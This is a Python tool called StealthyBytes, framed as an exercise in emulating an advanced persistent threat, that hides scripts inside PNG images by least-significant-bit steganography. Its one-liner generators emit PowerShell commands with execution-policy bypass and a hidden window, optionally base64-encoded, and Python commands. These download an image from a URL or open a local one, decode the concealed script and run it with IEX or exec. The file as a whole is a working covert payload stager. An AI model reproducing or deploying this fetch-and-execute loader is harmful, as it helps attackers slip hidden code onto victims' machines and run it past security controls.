# -*- coding: utf-8 -*-
#
#   Copyright 2023 Drinor Selmanaj
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
# ---------------------------------------------------------------------
# Description:
# StealthyBytes was developed as an exercise focused on emulating the TTPs of a well-known
# Advanced Persistent Threat (APT). 
# It leverages the Least Significant Bit (LSB) steganography for image content embedding. 
# The LSB technique subtly modifies image pixels for data concealment while maintaining visual integrity. 
# ---------------------------------------------------------------------

import argparse
import base64
import logging
import math
from PIL import Image
import urllib.request
from io import BytesIO

# Configure logging to aid in debugging and monitoring script execution
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')


def read_script(script_path):
    """
    Reads a script from a file.

    Args:
        script_path (str): File path of the script.

    Returns:
        str: Content of the script file.

    Raises:
        FileNotFoundError: If the script file does not exist.
    """

    with open(script_path, 'r') as file:
        return file.read()


def write_content(content, output_path=None):
    """
    Writes a script to a file.

    Args:
        script (str): The script content to be written.
        output_path (str): File path for the output script.

    Raises:
        IOError: If the file cannot be written.
    """

    try:
        with open(output_path, 'w') as file:
            file.write(content)
        logging.info(f"Content was written to {output_path}")
    except IOError as e:
        logging.error(f"Unable to write the content to {output_path}: {e}")
        raise


def download_image(url):
    """
    Downloads an image from a URL.

    Args:
        url (str): The URL of the image.

    Returns:
        PIL.Image.Image: The downloaded image object.
    """

    try:
        with urllib.request.urlopen(url) as response:
            return Image.open(BytesIO(response.read()))
    except urllib.error.URLError as e:
        logging.error(f"URL Error: Unable to download the image from {url}: {e}")
        raise
    except urllib.error.HTTPError as e:
        logging.error(f"HTTP Error: Unable to download the image from {url}: {e}")
        raise


def create_new_image(data_length):
    """
    Creates a new image of sufficient size to hold the given data length.

    Args:
        data_length (int): Length of the data to be embedded in the image in bytes.

    Returns:
        PIL.Image.Image: A new image object.
    """

    dimension = math.ceil(math.sqrt(data_length * 8))
    logging.info(f"Creating a new image of dimensions {dimension}x{dimension} to handle the payload of length {data_length} bytes")
    return Image.new('RGB', (dimension, dimension), (0, 0, 0))


def embed_in_image(content, output_path, image_path=None, auto_create_image=False):
    """
    Embeds a given contnet into an image and saves the modified image.

    This function embeds content into an image by converting into a bytearray 
    and then embedding this bytearray into the least significant bits of the image's pixel data. 
    The length of the content is also embedded in the initial bytes of the image for later extraction. 
    The modified image is then saved to the specified output path.

    If an image path is provided, the content is embedded into that image. Otherwise, a new image 
    of sufficient size is created to hold the script data. The embedding process is done by the 
    'embed_in_data' function.

    Args:
        content (str): The content to be embedded into the image.
        output_path (str): The path where the modified image will be saved.
        image_path (str, optional): The path of the image in which to embed the content. 
                                    If None, a new image will be created.

    Raises:
        IOError: If the image cannot be opened or created, or if there is an error in saving the image.

    Returns:
        str: A message indicating successful embedding or an error message.

    Note:
        The function logs informational and error messages to aid in debugging and monitoring.
    """

    content_bytes = bytearray(content, 'ascii')
    length_bytes = len(content_bytes).to_bytes(4, 'little')
    content_bytes = length_bytes + content_bytes
    
    try:
        if image_path:
            img = Image.open(image_path)
            if auto_create_image and img.size[0] * img.size[1] < len(content_bytes) * 8:
                logging.info("The provided image is too small.")
                img = create_new_image(len(content_bytes))
            elif img.size[0] * img.size[1] < len(content_bytes) * 8:
                raise ValueError("Provided image is too small and auto-creation is disabled.")
        else:
            logging.info("No image path provided. Creating a new image.")
            img = create_new_image(len(content_bytes))

        embed_in_data(img, content_bytes)  # Moved this inside the try block
        img.save(output_path, format='PNG')
        logging.info(f"Content embedded into {output_path}")
    except IOError as e:
        logging.error(f"Unable to open or create the image: {e}")
        return "Error"


def embed_in_data(img, content_bytes):
    """
    Embeds content into the least significant bits of an image's pixel data.

    This function takes a PIL Image object and a bytearray, and embeds it 
    into the least significant bits of the image's pixel data. It iterates over each byte of 
    the content and modifies the least significant bit of each RGB value in the image's pixels 
    to embed the content data. This process is a basic form of steganography.

    The function ensures that the image has enough pixels to embed the entire content. If the 
    image is not large enough to contain, it raises a ValueError.

    Args:
        img (PIL.Image.Image): The image object where the script will be embedded.
        content_bytes (bytearray): The content to be embedded in the image, represented as a bytearray.

    Raises:
        ValueError: If the image is not large enough to contain the data.

    Note:
        The function directly modifies the 'img' object and does not return any value.
    """

    pixels = list(img.getdata())
    width, height = img.size
    if len(pixels) < len(content_bytes) * 8:
        raise ValueError("Image not large enough to contain the data.")
    
    for i, byte in enumerate(content_bytes):
        for bit in range(8):
            pos = i * 8 + bit
            if pos >= len(pixels):
                break
            pixel = list(pixels[pos])
            for j in range(len(pixel)):  # Modify RGB values
                pixel[j] = (pixel[j] & ~1) | ((byte >> bit) & 1)
            pixels[pos] = tuple(pixel)

    img.putdata(pixels)
    

def extract_from_data(img):
    """
    Extracts an embedded content from a PIL Image object.

    This function processes an image to extract the data that has been
    embedded into it using steganographic techniques. The content is stored in the
    least significant bits of the image pixels. The function first retrieves the
    length of the script stored in the first few pixels, and then reads the script
    data accordingly.

    Args:
        img (PIL.Image.Image): The image object from which the data is to be extracted.

    Returns:
        str: The content extracted from the image, decoded from ASCII.
    """

    pixels = list(img.getdata())
    length_bytes = bytearray()
    for i in range(4):
        byte = 0
        for bit in range(8):
            pos = i * 8 + bit
            pixel = list(pixels[pos])
            byte |= (pixel[0] & 1) << bit
        length_bytes.append(byte)
    length = int.from_bytes(length_bytes, 'little')

    content_bytes = bytearray()
    for i in range(4, 4 + length):
        byte = 0
        for bit in range(8):
            pos = i * 8 + bit
            pixel = list(pixels[pos])
            byte |= (pixel[0] & 1) << bit
        content_bytes.append(byte)

    return content_bytes.decode('ascii')
    

def generate_powershell_one_liner(image_source, encode_base64=False):
    """
    Generates a PowerShell one-liner command to extract an embedded script from an image.

    This function constructs a PowerShell command that, when executed, will download
    an image from a given URL (or open a local file), extract an embedded script from it,
    and execute the script. The script extraction is performed using similar techniques
    as in extract_from_data, adapted for PowerShell syntax. The function also
    supports generating a Base64-encoded version of the PowerShell command.

    Args:
        image_source (str): The URL or local path of the image containing the embedded script.
        encode_base64 (bool): If True, the PowerShell command is encoded in Base64.

    Returns:
        str: A PowerShell command or Base64-encoded PowerShell command.
    """

    if image_source.startswith("http://") or image_source.startswith("https://"):
        # Logic for handling URLs in PowerShell
        one_liner = (
    f"& {{"
    "Add-Type -AssemblyName System.Drawing;"
    f"$u = '{image_source}'; "
    "$wc = New-Object Net.WebClient; "
    "$ib = $wc.DownloadData($u); "
    "$ms = New-Object IO.MemoryStream(, $ib); "
    "$b = [Drawing.Bitmap][Drawing.Image]::FromStream($ms); "
    "$lb = @(0,0,0,0); "
    "for ($i = 0; $i -lt 4; $i++) { "
    "for ($bt = 0; $bt -lt 8; $bt++) { "
    "$px = $b.GetPixel($i * 8 + $bt, 0); "
    "$lb[$i] = $lb[$i] -bor ($px.R -band 1) -shl $bt "
    "}}; "
    "$ln = [BitConverter]::ToInt32($lb, 0); "
    "$sb = @(); "
    "for ($j = 4; $j -lt ($ln + 4); $j++) { "
    "$by = 0; "
    "for ($bi = 0; $bi -lt 8; $bi++) { "
    "$ps = $j * 8 + $bi; "
    "$x = [Math]::Floor($ps / $b.Width); "
    "$y = $ps % $b.Width; "
    "$px = $b.GetPixel($y, $x); "
    "$by = $by -bor ($px.R -band 1) -shl $bi "
    "}; "
    "$sb += $by }; "
    "IEX([Text.Encoding]::ASCII.GetString($sb))}"
)
    else:
        # Logic for handling local files in PowerShell
        one_liner = (
    f"& {{"
    "Add-Type -AssemblyName System.Drawing;"
    f"$p = '{image_source}'; "
    "$b = [System.Drawing.Bitmap]::FromFile($p); "
    "$l = @(0,0,0,0); "
    "for ($i = 0; $i -lt 4; $i++) { "
    "for ($bit = 0; $bit -lt 8; $bit++) { "
    "$px = $b.GetPixel($i * 8 + $bit, 0); "
    "$l[$i] = $l[$i] -bor ($px.R -band 1) -shl $bit "
    "}}; "
    "$len = [BitConverter]::ToInt32($l, 0); "
    "$sb = @(); "
    "for ($j = 4; $j -lt ($len + 4); $j++) { "
    "$by = 0; "
    "for ($bt = 0; $bt -lt 8; $bt++) { "
    "$pos = $j * 8 + $bt; "
    "$x = [Math]::Floor($pos / $b.Width); "
    "$y = $pos % $b.Width; "
    "$px = $b.GetPixel($y, $x); "
    "$by = $by -bor ($px.R -band 1) -shl $bt "
    "}; "
    "$sb += $by }; "
    "$b.Dispose(); "
    "IEX([System.Text.Encoding]::ASCII.GetString($sb))}"
)

    if encode_base64:
        bytes_one_liner = one_liner.encode('utf-16le')
        base64_encoded = base64.b64encode(bytes_one_liner).decode()
        return f"powershell.exe -noni -noexit -ep bypass -w hidden -e {base64_encoded}"
    else:
        return f"powershell.exe -noni -noexit -ep bypass -w hidden -c \"{one_liner}\""

            
def generate_python_one_liner(image_source, encode_base64=False):
    """
    Generates a Python one-liner command to extract an embedded script from an image.

    This function constructs a Python command that, when executed, will either download
    an image from a given URL or open a local file, then extract an embedded script from it,
    and finally execute the script. It leverages the Python Imaging Library (PIL) to process
    the image and extract the script data embedded in the least significant bits of the image pixels.
    The function also supports generating a Base64-encoded version of the Python command for
    enhanced command-line usability.

    Args:
        image_source (str): The URL or local path of the image containing the embedded script.
        encode_base64 (bool): If True, the Python command is encoded in Base64.

    Returns:
        str: A Python command or Base64-encoded Python command.
    """

    if image_source.startswith("http://") or image_source.startswith("https://"):
            # Logic for handling URLs in Python
            one_liner = (
    f"python3 -c \"import urllib.request; from io import BytesIO; "
    f"from PIL import Image; a = '{image_source}'; b = urllib.request.urlopen(a); "
    "c = b.read(); b.close(); d = Image.open(BytesIO(c)); e = list(d.getdata()); "
    "f = bytearray(); g = bytearray(); [f.append(sum(((list(e[h * 8 + i])[0] & 1) "
    "<< i for i in range(8)))) for h in range(4)]; j = int.from_bytes(f, 'little'); "
    "[g.append(sum(((list(e[h * 8 + i])[0] & 1) << i for i in range(8)))) for h in "
    "range(4, 4 + j)]; exec(g.decode('ascii'))\""
)
    else:
            # Logic for handling local files in Python
        one_liner = (
    f"from PIL import Image; a = Image.open('{image_source}'); "
    "b = list(a.getdata()); c = bytearray(); d = bytearray(); "
    "[c.append(sum(((list(b[e * 8 + f])[0] & 1) << f for f in range(8)))) "
    "for e in range(4)]; g = int.from_bytes(c, 'little'); "
    "[d.append(sum(((list(b[e * 8 + f])[0] & 1) << f for f in range(8)))) "
    "for e in range(4, 4 + g)]; exec(d.decode('ascii'))"
)
        
    if encode_base64:
        encoded_one_liner = base64.b64encode(one_liner.encode()).decode()
        return f"python3 -c \"import base64; exec(base64.b64decode('{encoded_one_liner}'))\""
    else:
        return f"python3 -c \"{one_liner}\""


def main():
    """
    Main function for script embedding and extraction.

    This script provides three modes of operation:
    1. Embedding a script into an image.
    2. Extracting an embedded script from an image.
    3. Generating a one-liner command for script extraction.

    Usage:
        To embed a script into an image:
        python script.py --mode embed --script script.py --output embedded_image.png [--image input_image.png]

        To extract an embedded script from an image:
        python script.py --mode extract --image embedded_image.png --output extracted_script.py

        To extract an embedded script from a web image:
        python script.py --mode extract --url image_url --output extracted_script.py

        To generate a one-liner for script extraction:
        python script.py --mode one_liner --image embedded_image.png
        or
        python script.py --mode one_liner --url image_url
    """

    parser = argparse.ArgumentParser(description="Embed or Extract a script in/from an image file.")
    parser.add_argument("-m", "--mode", required=True, choices=['embed', 'extract', 'one_liner'],
                        help="Operation mode: embed, extract, or one_liner.")
    parser.add_argument("-s", "--script", help="Path to the script file for embedding.")
    parser.add_argument("-o", "--output", help="Path to save the output image or extract the script to.")
    parser.add_argument("-i", "--image", help="Path to the input image for embedding or extraction.")
    parser.add_argument("-u", "--url", help="URL of the web image for extraction or one-liner generation.")
    parser.add_argument("--string", help="Direct string input for embedding in the image.")
    parser.add_argument("--show", action="store_true", help="Display extracted script content in the terminal.")
    parser.add_argument("--base64", action="store_true", help="Encode the one-liner in base64.")
    parser.add_argument("--powershell", action="store_true", help="Generate the one-liner in PowerShell.")
    parser.add_argument("--python", action="store_true", help="Generate the one-liner in Python.")
    parser.add_argument("--auto-create-image", action="store_true", help="Automatically create a new image if the existing one is too small.")

    args = parser.parse_args()

    try:
        if args.mode == 'embed':
            if args.image and args.script and args.output:
                script = read_script(args.script)
                embed_in_image(script, args.output, args.image, args.auto_create_image)
            elif args.image and args.string and args.output:
                embed_in_image(args.string, args.output, args.image, args.auto_create_image)
            else:
                if not args.image:
                    parser.error("Error: Embed mode requires --image argument.")
                else:
                    parser.error("Error: Embed mode with --string or --script requires --output argument.")
        elif args.mode == 'extract':
            if args.url:
                img = download_image(args.url)
            elif args.image:
                img = Image.open(args.image)
            else:
                parser.error("Error: Extract mode requires either --image or --url argument.")

            content = extract_from_data(img)

            if not args.show and not args.output:
                args.show = True

            if args.show:
                logging.info(f"Extracted Script Content:\n")
                logging.info(content)

            if args.output:
                write_content(content, args.output)

        elif args.mode == 'one_liner':
            if args.url or args.image:
                image_source = args.url if args.url else args.image
                if args.powershell:
                    one_liner = generate_powershell_one_liner(image_source, args.base64)
                elif args.python:
                    one_liner = generate_python_one_liner(image_source, args.base64)
                else:
                    one_liner = generate_python_one_liner(image_source, args.base64)  # default to Python if no specific flag is provided
                logging.info(one_liner)  
            else:
                parser.error("Error: one_liner mode requires either --image or --url argument.")
    except Exception as e:
        logging.error(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
